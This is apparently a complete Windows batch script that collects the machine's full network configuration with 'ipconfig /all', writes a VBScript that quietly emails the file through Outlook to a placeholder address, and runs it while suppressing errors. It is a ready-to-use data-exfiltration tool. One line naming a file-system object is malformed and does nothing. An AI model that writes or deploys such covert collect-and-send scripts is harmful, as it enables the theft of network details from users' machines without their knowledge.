@echo off 
cls
ipconfig /all >> C:\attachment.txt
goto mailpart
:mailpart
echo Dim x >> c:\ipmail.vbs
echo on error resume next  >> c:\ipmail.vbs
echo Set fso ="Scripting.FileSystem.Object"  >> c:\ipmail.vbs
echo Set so=CreateObject(fso)  >> c:\ipmail.vbs
echo Set ol=CreateObject("Outlook.Application")  >> c:\ipmail.vbs
echo Set out= WScript.CreateObject("Outlook.Application")  >> c:\ipmail.vbs
echo Set Mail=ol.CreateItem(0)  >> c:\ipmail.vbs
echo Mail.to="EMAILADD@EMAIL.COM"  >> c:\ipmail.vbs
echo Mail.Subject="IP"  >> c:\ipmail.vbs
echo Mail.Body="IP"  >> c:\ipmail.vbs
echo Mail.Attachments.Add("c:\attachment.txt") >> c:\ipmail.vbs
echo Mail.Send  >> c:\ipmail.vbs
echo ol.Quit >> c:\ipmail.vbs
start c:\ipmail.vbs
exit
